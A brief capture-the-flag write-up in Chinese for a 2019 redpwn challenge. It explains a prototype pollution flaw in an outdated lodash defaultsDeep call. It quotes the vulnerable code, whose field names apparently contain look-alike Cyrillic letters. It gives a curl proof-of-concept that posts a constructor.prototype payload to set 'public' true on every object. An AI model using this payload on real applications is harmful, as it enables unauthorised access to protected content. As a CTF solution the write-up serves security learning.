漏洞 : <br>
        lodash 版本過期, 存在 prototype pollution 問題

解題流程<br>
        利用 "constructor":{"prototype":{"public":true}} 可將所有的 object 的 public 設成 True



問題點：
```
 	parsedBody = _.defaultsDeep({ 
          publiс: false,
          cоntent: '',
        }, JSON.parse(body))
```

POC:
```
curl -X POST -H "Content-Type: application/json" --cookie "user_id=7d3623be52091cef26f6244141cce3f4" -d '{"constructor":{"prototype":{"public":true}}}' http://chall2.2019.redpwn.net:8002/make
```
